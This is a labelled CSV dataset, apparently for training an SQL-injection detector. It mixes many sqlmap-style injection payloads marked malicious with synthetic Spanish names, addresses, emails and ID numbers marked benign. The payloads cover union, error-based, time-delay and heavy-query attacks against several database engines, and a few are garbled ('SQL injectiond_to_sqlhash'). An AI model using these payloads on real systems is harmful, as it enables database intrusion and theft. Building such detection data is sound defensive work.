payload;attack_type;label
1,(convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4932=4932) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))));SQL injection;malicious
-5830) or 1570=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (1570=1570) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)));SQL injection;malicious
1'||(select 'neqi' where 6873=6873 union all select null,null,null,null,null,null,null--;SQL injection;malicious
"1%""));waitfor delay '0:0:5' and ((""%""=""";SQL injection;malicious
"1"" and 9468=7105--";SQL injection;malicious
"1 where 4245=4245;select (case when (6276=6276) then 6276 else 6276*(select 6276 from information_schema.character_sets) end)#";SQL injection;malicious
1') as eyzk where 2489=2489 and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))--;SQL injection;malicious
1%') and make_set(1458=3902,3902) and ('%'=';SQL injection;malicious
-3775') as rqet where 7092=7092 or elt(1032=1032,3623)--;SQL injection;malicious
"1%""));select (case when (4769=4769) then 4769 else 4769*(select 4769 from mysql.db) end)#";SQL injection;malicious
"1) where 9708=9708;select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--";SQL injection;malicious
1%'))) or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666) and ((('%'=';SQL injection;malicious
-7779') where 4976=4976 or 6872=6872--;SQL injection;malicious
1'||(select 'rjun' where 8868=8868 and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))))||';SQL injection;malicious
"-4876"")) as saug where 2256=2256 union all select 2256,2256,2256,2256,2256,2256,2256,2256,2256,2256--";SQL injection;malicious
1) where 7815=7815 union all select null,null,null,null,null,null,null#;SQL injection;malicious
-3595'+(select vppx where 6018=6018 union all select 6018,6018,6018,6018,6018#;SQL injection;malicious
"1"" and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5) and ""icow"" like ""icow";SQL injection;malicious
"1 where 1576=1576;select dbms_pipe.receive_message(chr(112)||chr(70)||chr(106)||chr(78),5) from dual--";SQL injection;malicious
"-3638"" union all select 4394,4394,4394,4394,4394,4394,4394--";SQL injection;malicious
1'||(select 'fzcu' where 9252=9252 procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1))||';SQL injection;malicious
"1'));select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--";SQL injection;malicious
1)) as dhge where 4816=4816 and 2388=benchmark(5000000,md5(0x6d457153))#;SQL injection;malicious
"1""));select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--";SQL injection;malicious
1'||(select 'ucro' where 9912=9912 and 8594=(select 8594 from pg_sleep(5))--;SQL injection;malicious
"1' in boolean mode);select (case when (1275=7674) then 1275 else 1275*(select 1275 from information_schema.character_sets) end)#";SQL injection;malicious
"-3933%"")) or elt(8142=2978,2978) and ((""%""=""";SQL injection;malicious
"-1447"" union all select 3013,3013,3013,3013,3013,3013,3013--";SQL injection;malicious
1))) or elt(6272=6272,sleep(5)) and (((9558=9558;SQL injection;malicious
1' or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x) and 'kdxg' like 'kdxg;SQL injection;malicious
-8074') or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and ('lnwm'='lnwm;SQL injection;malicious
"1) where 2307=2307;select (case when (1946=1302) then 1946 else 1/(select 0) end)--";SQL injection;malicious
-8266%') union all select 8626,8626,8626,8626,8626,8626--;SQL injection;malicious
"-2953"") or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and (""oaeh""=""oaeh";SQL injection;malicious
1)) and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x) and ((9325=9325;SQL injection;malicious
-9615) as dntk where 4780=4780 union all select 4780,4780,4780,4780,4780,4780,4780,4780#;SQL injection;malicious
"1)));select pg_sleep(5)--";SQL injection;malicious
1) where 9645=9645 union all select null,null,null--;SQL injection;malicious
"1'));begin dbms_lock.sleep(5); end and (('zeyr'='zeyr";SQL injection;malicious
"1"")) as khqq where 3637=3637 and 8407=(select count(*) from generate_series(1,5000000))--";SQL injection;malicious
1'+(select 'igoi' where 7823=7823 or 8421=(select count(*) from generate_series(1,5000000)))+';SQL injection;malicious
1'+(select iowv where 6105=6105 and sleep(5)#;SQL injection;malicious
1)) union all select null,null,null,null,null--;SQL injection;malicious
"-7996"")) or 4747=dbms_utility.SQL injectiond_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ((""iuzv"" like ""iuzv";SQL injection;malicious
"1);select (case when (3855=3855) then 3855 else 1/(select 0) end)--";SQL injection;malicious
-3496')) or 9323=9323#;SQL injection;malicious
1')) or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666) and (('zjnp'='zjnp;SQL injection;malicious
"1)));select (case when (4666=4666) then 1 else 4666*(select 4666 from master..sysdatabases) end)--";SQL injection;malicious
1) and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)));SQL injection;malicious
1'+(select 'mtpt' where 7483=7483 union all select null,null,null,null,null,null,null,null,null--;SQL injection;malicious
1 and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5);SQL injection;malicious
"1"") and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and (""ynde""=""ynde";SQL injection;malicious
"1%"")) union all select null,null--";SQL injection;malicious
-4453'))) or 1570=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (1570=1570) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ((('boxt'='boxt;SQL injection;malicious
-4979')) or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and (('ofgg'='ofgg;SQL injection;malicious
"1"") as mszg where 6184=6184 rlike sleep(5)--";SQL injection;malicious
-7001'+(select slav where 9321=9321 union all select 9321,9321,9321,9321,9321,9321,9321,9321,9321--;SQL injection;malicious
1)) and 7756=dbms_utility.SQL injectiond_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ((9452=9452;SQL injection;malicious
"1%""))) union all select null,null--";SQL injection;malicious
1') or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null);SQL injection;malicious
1'||(select 'votg' where 5105=5105 or 8156=(select count(*) from generate_series(1,5000000))--;SQL injection;malicious
1) as ztrb where 1052=1052 and (select * from (select(sleep(5)))gcrr)#;SQL injection;malicious
"1') as sruz where 6318=6318;select (case when (6287=8341) then 6287 else 1/(select 0) end)--";SQL injection;malicious
1%')) and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and (('%'=';SQL injection;malicious
-5903%') union all select 8293,8293,8293,8293,8293,8293,8293,8293#;SQL injection;malicious
-6423') or 6872=6872;SQL injection;malicious
"1%"")));if(7427=7800) select 7427 else drop function dgir--";SQL injection;malicious
"-7460"" union all select 4273,4273,4273,4273,4273,4273,4273,4273#";SQL injection;malicious
"-9932"" union all select 4049,4049,4049--";SQL injection;malicious
1'||(select 'vasx' where 4770=4770 and 7756=dbms_utility.SQL injectiond_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))))||';SQL injection;malicious
1'||(select 'pzto' from dual where 7338=7338 and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4))||';SQL injection;malicious
-2530%' order by 1#;SQL injection;malicious
1') where 3330=3330 and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--;SQL injection;malicious
-4347' union all select 6074,6074,6074,6074,6074,6074,6074--;SQL injection;malicious
1) where 5378=5378 and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610)))--;SQL injection;malicious
1'))) or 8421=(select count(*) from generate_series(1,5000000)) and ((('istb'='istb;SQL injection;malicious
1) and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4);SQL injection;malicious
1 where 2914=2914 union all select null,null,null#;SQL injection;malicious
1' where 2123=2123 or 8384=like('abcdefg',upper(hex(randomblob(500000000/2))))--;SQL injection;malicious
"1"")) as swwb where 4244=4244;select like('abcdefg',upper(hex(randomblob(500000000/2))))--";SQL injection;malicious
"1'||(select 'adni' from dual where 6611=6611;select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual)||'";SQL injection;malicious
1' and 5967=4184#;SQL injection;malicious
-3186 or 3867=9405;SQL injection;malicious
1'||(select 'gwxc' from dual where 3626=3626 and char(107)||char(121)||char(97)||char(80)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--;SQL injection;malicious
1) and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq');SQL injection;malicious
1%')) or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and (('%'=';SQL injection;malicious
1,(select (case when (6750=6750) then 1 else 6750*(select 6750 from information_schema.character_sets) end));SQL injection;malicious
(select (case when (5603=5603) then 5603 else cast(1 as int)/(select 0 from dual) end) from dual);SQL injection;malicious
"-5591%"")) order by 1--";SQL injection;malicious
-8274')) union all select 3048--;SQL injection;malicious
-9975 where 9760=9760 order by 1--;SQL injection;malicious
-4960') union all select 5300--;SQL injection;malicious
1%'))) and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ((('%'=';SQL injection;malicious
40184;benign;benign
nuda drudes;benign;benign
c/ del ferrocarril, 152,;benign;benign
2070765320009143;benign;benign
1902;benign;benign
ulldemol bujeque;benign;benign
plaa caudillo 60;benign;benign
maala8;benign;benign
peuela sains;benign;benign
c/ 57 15, 9g;benign;benign
empeltre;benign;benign
estantalar;benign;benign
21924971z;benign;benign
25260;benign;benign
h9655;benign;benign
dunlap-leaud@videospornocaseros.ye;benign;benign
pobla de montorns, la;benign;benign
kong-que;benign;benign
goggin;benign;benign
plebs cadevall;benign;benign
cueva de montesinos 80 11-g;benign;benign
xiangsen;benign;benign
01633578a;benign;benign
5562206225092204;benign;benign
4377;benign;benign
molledo basagaa;benign;benign
carretera de las ermitas 188;benign;benign
lauriaul;benign;benign
nype.shafer@canovash.bv;benign;benign
merindad de ro ubierna;benign;benign
robieux;benign;benign
darby;benign;benign
thalasso.chappell@titulosoficiales.jp;benign;benign
0350022340129740;benign;benign
julisa;benign;benign
03266253t;benign;benign
0992218178104844;benign;benign
5788;benign;benign
graziana;benign;benign
16648;benign;benign
07u8e37ia;benign;benign
07901950r;benign;benign
39638;benign;benign
portal;benign;benign
marino;benign;benign
c/ garcia morente 129;benign;benign
2533839429419532;benign;benign
natn;benign;benign
68201502q;benign;benign
36680;benign;benign
*r6t58a;benign;benign
r8cid0va;benign;benign
14977979b;benign;benign
45183;benign;benign
d2s7sp79ro;benign;benign
spiegel-haake@convention.no;benign;benign
turcia;benign;benign
r92e1*56e;benign;benign
pu6ue97;benign;benign
72367579b;benign;benign
1721278325772936;benign;benign
starr-fjelmose@cdgranadabaila.travel;benign;benign
47815;benign;benign
2354;benign;benign
raian;benign;benign
78977050h;benign;benign
24224;benign;benign
58772485x;benign;benign
39515;benign;benign
zanquita;benign;benign
14ab214c6n;benign;benign
quartet@cabare.com.cs;benign;benign
espluga de francol l';benign;benign
acre;benign;benign
52137467d;benign;benign
31282;benign;benign
62si27t8ico;benign;benign
encrasar;benign;benign
86943454g;benign;benign
lubna;benign;benign
pealver palenzuela;benign;benign
zabalza;benign;benign
erickson;benign;benign
procacci;benign;benign
conde;benign;benign
25330;benign;benign
mialgi5;benign;benign
pablo iglesias s/n 2?f;benign;benign
technoso;benign;benign
briseboi;benign;benign
39699852n;benign;benign
37115;benign;benign
comisorio;benign;benign
pesche@campodegolf.com.sy;benign;benign
valseca;benign;benign
419747iv6;benign;benign
orientalista;benign;benign
sala@mystyleperfume.ls;benign;benign
7771884953425478;benign;benign
telema;benign;benign
25109956m;benign;benign
45370;benign;benign
arrego76arse;benign;benign
1i6p06ej7;benign;benign
54709157t;benign;benign
1571256483586961;benign;benign
sibonet;benign;benign
estrada mendiarte s/n, 10?a;benign;benign
sa89gn;benign;benign
cojera;benign;benign
calle madagascar 130;benign;benign
ineluctable;benign;benign
pozzetto@miplat.am;benign;benign
cervera de la caada;benign;benign
havis;benign;benign
cooksey;benign;benign
gomero gallardo;benign;benign
paratge ter, 33,;benign;benign
vial;benign;benign
37905890g;benign;benign
40529;benign;benign
encalador;benign;benign
ten.tar;benign;benign
vitola@23horas.ad;benign;benign
45810;benign;benign
desconsolar;benign;benign
infante juan manuel s/n 5?a;benign;benign
9738066615220073;benign;benign
blondell3;benign;benign
peller@arvigar.gs;benign;benign
49135;benign;benign
escultrico;benign;benign
69634179t;benign;benign
6689689469452036;benign;benign
3318;benign;benign
salgado pladellorens;benign;benign
villadoz;benign;benign
8ienne2s6;benign;benign
horcajo de montemayor;benign;benign
sensualmente;benign;benign
fabrizio;benign;benign
c/ gravina, s/n;benign;benign
6453670410602968;benign;benign
iraola rudi;benign;benign
castellanos de zapardiel;benign;benign
-3136%') or 3400=6002;SQL injection;malicious
"1')) as gfzb where 7904=7904;begin dbms_lock.sleep(5); end--";SQL injection;malicious
"1"")) and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and ((""smnw"" like ""smnw";SQL injection;malicious
-2604)) as sekb where 6897=6897 or 1000=7683;SQL injection;malicious
"1');begin dbms_lock.sleep(5); end and ('jzlr'='jzlr";SQL injection;malicious
"1%"")));create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5) and (((""%""=""";SQL injection;malicious
-1638' or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and 'xkne'='xkne;SQL injection;malicious
"1%"";call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--";SQL injection;malicious
tweddle;benign;benign
sirevici;benign;benign
90230020p;benign;benign
6034871098442134;benign;benign
vingelli9@custombikesclothes.fr;benign;benign
fuentelmonge;benign;benign
m*ule38;benign;benign
cimorra;benign;benign
knippenberg@soyriojano.cf;benign;benign
iza;benign;benign
martinn sampayo;benign;benign
calle plantio, 178,;benign;benign
benning;benign;benign
sask;benign;benign
rudie@deuxmanagement.jo;benign;benign
guilas;benign;benign
ramblizo;benign;benign
8043015940180984;benign;benign
6087;benign;benign
stoeckel@hacia.sa;benign;benign
tossa de mar;benign;benign
rescisorio;benign;benign
valdemaluque;benign;benign
masahiro;benign;benign
humfrey;benign;benign
brines grimalda;benign;benign
calle hernan cortes, 58,;benign;benign
38i2t702;benign;benign
c/ reina del cielo 136, 8-d;benign;benign
09ca93a4i9lar;benign;benign
70p89c9cion958;benign;benign
drozdek.waechter@tarifasdevuelos.bj;benign;benign
villacastn;benign;benign
hans;benign;benign
30666350j;benign;benign
12965;benign;benign
vivie4;benign;benign
colosse@velaconsultores.gob;benign;benign
fuente de pedro naharro;benign;benign
inusitado;benign;benign
69557398q;benign;benign
beilul;benign;benign
hadel;benign;benign
brivio;benign;benign
ansa-sobrarbe;benign;benign
rebalg1r;benign;benign
88426780z;benign;benign
34111;benign;benign
2268;benign;benign
47355557y;benign;benign
5393761266970595;benign;benign
leonila;benign;benign
49511678s;benign;benign
08191;benign;benign
rosoli;benign;benign
tr?abal;benign;benign
plaza tilos s/n;benign;benign
7578225963562090;benign;benign
helano;benign;benign
20847295a;benign;benign
14140;benign;benign
544;benign;benign
arn cantisn;benign;benign
langa del castillo;benign;benign
jaswal;benign;benign
limongi diguez;benign;benign
pleitas;benign;benign
arme!lluela;benign;benign
menju;benign;benign
23251820q;benign;benign
06927;benign;benign
ezequiel;benign;benign
calle alfaz del pi, 96 11?d;benign;benign
8198356178876064;benign;benign
3880;benign;benign
97230292t;benign;benign
28194;benign;benign
leonelo;benign;benign
83217349z;benign;benign
3413347210986966;benign;benign
3040;benign;benign
hindman@primeracasa-ebs.il;benign;benign
alarba;benign;benign
cowart;benign;benign
garrudo castellon;benign;benign
calle pea 49, 9?b;benign;benign
merriell;benign;benign
alvean;benign;benign
16574331w;benign;benign
33001;benign;benign
roehn.kernke@eldeseodepecar.ec;benign;benign
8914644367191799;benign;benign
2049;benign;benign
hirn;benign;benign
c/ mirra 25,;benign;benign
8648898617825850;benign;benign
nimia;benign;benign
inocencia alayon, s/n 4-f;benign;benign
3227728964471059;benign;benign
3244;benign;benign
amarili;benign;benign
c/ general merry del val, s/n;benign;benign
wa77en;benign;benign
50513;benign;benign
c7ada98o;benign;benign
tolera9lemen8e;benign;benign
byron@vinavilano.gl;benign;benign
45790;benign;benign
descote;benign;benign
14554532v;benign;benign
muth;benign;benign
neufeld;benign;benign
benson-rabasa@mareventsprotocolosocial.ad;benign;benign
urdiales del pramo;benign;benign
oti sineiro;benign;benign
avellanosa de mu;benign;benign
teddie;benign;benign
583opi4;benign;benign
radir@diagnosticoradiologico.mil;benign;benign
galende;benign;benign
vacher;benign;benign
77232447b;benign;benign
5399041434530750;benign;benign
8516;benign;benign
einar;benign;benign
c/ la hoz, 17;benign;benign
sandie;benign;benign
pavlow@permutatucasa.fm;benign;benign
9438831900620350;benign;benign
1789;benign;benign
corico;benign;benign
sayago, 156,;benign;benign
hocutt;benign;benign
garcez iturriria;benign;benign
galeno 106, 9?c;benign;benign
8444341614355746;benign;benign
8436;benign;benign
donaciano;benign;benign
c/ guillen santacilla 94;benign;benign
harmonie;benign;benign
ikediek torrades;benign;benign
oso, el;benign;benign
3andador4;benign;benign
demos3rativa;benign;benign
45854746z;benign;benign
08030;benign;benign
mairozio;benign;benign
78258633y;benign;benign
2930629510541352;benign;benign
iorgo;benign;benign
mouchet@007tv.fj;benign;benign
roelos de sayago;benign;benign
cabildeo;benign;benign
46942381w;benign;benign
17861;benign;benign
gravoso;benign;benign
e1bud8;benign;benign
gude1@messadivoce.ai;benign;benign
09228;benign;benign
torns;benign;benign
19783837l;benign;benign
09270;benign;benign
alatn;benign;benign
jernima;benign;benign
69653229y;benign;benign
14970;benign;benign
encuar;benign;benign
angele6@juegossonic.com.eh;benign;benign
uju;benign;benign
loudiadi;benign;benign
athony;benign;benign
bedmar;benign;benign
calle doctor jose manuel pascual y pascual 146, 4?c;benign;benign
0936495801431480;benign;benign
ordezanka@arroyo-molinos.dj;benign;benign
49495;benign;benign
malandrn;benign;benign
fantaseadora;benign;benign
28045405x;benign;benign
18212;benign;benign
rayadillo;benign;benign
81587737k;benign;benign
3302117123489448;benign;benign
576;benign;benign
jemima;benign;benign
87348482w;benign;benign
8490972534756597;benign;benign
vivencio;benign;benign
hermanos barral 61;benign;benign
5076820691273276;benign;benign
9253;benign;benign
quiyen;benign;benign
pl. herrera de los navarros 68 12-h;benign;benign
chung;benign;benign
96269598q;benign;benign
7626699319590675;benign;benign
2864;benign;benign
miller_fiore9@olvidalo.sy;benign;benign
50297;benign;benign
j804n86o;benign;benign
52984297w;benign;benign
tetreaul7;benign;benign
23l8noi7e;benign;benign
38888523p;benign;benign
bui;benign;benign
arena@productosgarantizados.uy;benign;benign
hornillos del camino;benign;benign
8671;benign;benign
yeti llamus;benign;benign
bscones de ojeda;benign;benign
faucette;benign;benign
thyssen.ferrell@somosagelespaa.bg;benign;benign
sant joan de vilatorrada;benign;benign
pipponzi;benign;benign
enconadura;benign;benign
47606;benign;benign
vogin;benign;benign
c/ bascuana 52, 5-e;benign;benign
c4ap0765do;benign;benign
neri;benign;benign
san jorge, 188;benign;benign
9771406974624162;benign;benign
gastn;benign;benign
69441548v;benign;benign
5220241028812840;benign;benign
denni;benign;benign
torremoroso enrich;benign;benign
c/ torre, 151, 9?b;benign;benign
dowser;benign;benign
thordsen@guejos.sy;benign;benign
46842;benign;benign
?malgastador;benign;benign
26t9g71;benign;benign
foody@cup-id.sd;benign;benign
aldehuela de yeltes;benign;benign
babs;benign;benign
cladera;benign;benign
calle los tipografos, 98, 4g;benign;benign
funderbu;benign;benign
patenaud;benign;benign
barreras de la bandera;benign;benign
calle joaquin gamon 175, 2-c;benign;benign
coder;benign;benign
tredway;benign;benign
scherzin;benign;benign
princep muntadas;benign;benign
9475732136741046;benign;benign
10262643c;benign;benign
1055239425022881;benign;benign
8232;benign;benign
passeig bosc, 157;benign;benign
eugenia;benign;benign
bestard;benign;benign
padre maltes 26 5a;benign;benign
0183912378069519;benign;benign
stroupe;benign;benign
flloko-humet@imarbella.ms;benign;benign
cervatos de la cueza;benign;benign
mathur;benign;benign
rost jorge;benign;benign
pedrosa d 15, 7?a;benign;benign
griffy;benign;benign
antonino;benign;benign
1034309024332493;benign;benign
3690;benign;benign
camp fein;benign;benign
c/ les parres, 168;benign;benign
5980859147106836;benign;benign
remo;benign;benign
1919202553686950;benign;benign
297;benign;benign
junco llavallo;benign;benign
calle perez galdos, 167;benign;benign
4907869$l2;benign;benign
sant celoni;benign;benign
9457;benign;benign
sterland@zingtonos.vg;benign;benign
goi;benign;benign
johann;benign;benign
39669776c;benign;benign
newport;benign;benign
alegre nomdedeu;benign;benign
carras@quiromante.vi;benign;benign
hontangas;benign;benign
-4182)) as wkfh where 6145=6145 union all select 6145,6145,6145,6145,6145#;SQL injection;malicious
1' where 8584=8584 order by 1#;SQL injection;malicious
"1'));select (case when (8601=1220) then 8601 else 8601*(select 8601 from mysql.db) end)#";SQL injection;malicious
"1"")) or 6979=like('abcdefg',upper(hex(randomblob(500000000/2))))--";SQL injection;malicious
"1%'));select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual and (('%'='";SQL injection;malicious
"1""))) and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and (((""gfwz""=""gfwz";SQL injection;malicious
"1));select (case when (3855=3855) then 3855 else 1/(select 0) end)--";SQL injection;malicious
1) or char(119)||char(100)||char(99)||char(121)=regexp_substring(repeat(right(char(1441),0),5000000000),null)--;SQL injection;malicious
"1) as imdt where 6431=6431;begin user_lock.sleep(5); end--";SQL injection;malicious
"1'||(select 'mosp' where 6085=6085;waitfor delay '0:0:5'--";SQL injection;malicious
-6789'||(select 'uckz' from dual where 2163=2163 union all select 2163,2163,2163,2163,2163,2163--;SQL injection;malicious
-8143) union all select 3014--;SQL injection;malicious
"-3884"" where 8012=8012 union all select 8012,8012#";SQL injection;malicious
"1"") where 2834=2834 (select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users)--";SQL injection;malicious
1) where 2679=2679 or 4915=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--;SQL injection;malicious
-9336' or 5641=9488#;SQL injection;malicious
"1"") where 7548=7548;select sleep(5)--";SQL injection;malicious
1' where 4134=4134 and 1102=6300--;SQL injection;malicious
(cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select 1 from generate_series(9815,9815,case when (9815=9815) then 1 else 0 end) limit 1)::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric));SQL injection;malicious
1') where 3262=3262 union all select null,null,null,null,null,null,null,null,null,null#;SQL injection;malicious
"1 where 2382=2382;(select * from (select(sleep(5)))acdk)#";SQL injection;malicious
1'||(select 'puco' where 2605=2605 union all select null#;SQL injection;malicious
-2333' union all select 9714,9714,9714--;SQL injection;malicious
"1'+(select 'vddk' where 6961=6961;if(4194=4133) select 4194 else drop function tqhz--";SQL injection;malicious
1%')) or 8384=like('abcdefg',upper(hex(randomblob(500000000/2)))) and (('%'=';SQL injection;malicious
1%') and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq') and ('%'=';SQL injection;malicious
"1'||(select 'aevx' from dual where 9999=9999;create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5))||'";SQL injection;malicious
"1%"")) and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x)) and ((""%""=""";SQL injection;malicious
-3938%'))) or 2034=7209#;SQL injection;malicious
1'))) or (select * from (select(sleep(5)))ydpu) and ((('jrpk'='jrpk;SQL injection;malicious
"-7868"" union all select 1805--";SQL injection;malicious
"-8060"") where 5290=5290 or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq')--";SQL injection;malicious
"1""))) and 7533=7533 and (((""alvd"" like ""alvd";SQL injection;malicious
1') as ildf where 5545=5545 union all select null,null,null,null#;SQL injection;malicious
"1"" where 6800=6800 procedure analyse(extractvalue(9627,concat(0x5c,(benchmark(5000000,md5(0x4b774c75))))),1)#";SQL injection;malicious
"-4954%"") or 5244=4832";SQL injection;malicious
"-9256"")) union all select 2977,2977,2977,2977,2977,2977,2977--";SQL injection;malicious
"1%"" and char(109)||char(79)||char(70)||char(90)=regexp_substring(repeat(right(char(5012),0),5000000000),null)--";SQL injection;malicious
-9100) or 8792=9550--;SQL injection;malicious
"1' in boolean mode);select count(*) from generate_series(1,5000000)#";SQL injection;malicious
-9672')) as rupb where 8218=8218 or make_set(4954=1836,1836)--;SQL injection;malicious
"1%""))) or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and (((""%""=""";SQL injection;malicious
1' and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and 'fdbm' like 'fdbm;SQL injection;malicious
1'+(select yfuu where 1717=1717 union all select null,null,null,null,null,null,null,null,null--;SQL injection;malicious
